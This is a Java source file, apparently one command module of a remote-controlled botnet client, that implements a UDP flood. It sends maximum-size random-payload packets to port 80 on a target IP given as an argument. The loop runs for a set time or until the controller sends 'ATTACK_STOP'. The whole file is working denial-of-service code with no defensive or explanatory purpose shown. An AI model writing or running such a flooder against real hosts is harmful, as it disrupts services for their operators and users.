package net.vitox.client.commands;

import net.vitox.client.InterpreteCMD;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;

public class UDPAttack {

    public static void startAttack(String[] args) {

        long startTime = System.currentTimeMillis();

        try {

            DatagramSocket socket = null;
            InetAddress address = null;
            byte[] buf = new byte[65507];
            SecureRandom random = new SecureRandom();

            String ipAddr = args[2];
            int portDst = 80;

            socket = new DatagramSocket();

            address = InetAddress.getByName(ipAddr);

            random.nextBytes(buf);
            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, portDst);

            while (!InterpreteCMD.getCommand.equals("ATTACK_STOP")) {

                socket.send(packet);
                if (System.currentTimeMillis() - startTime > Long.parseLong(args[1])) {
                    break;
                }
            }

            socket.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

    }
}
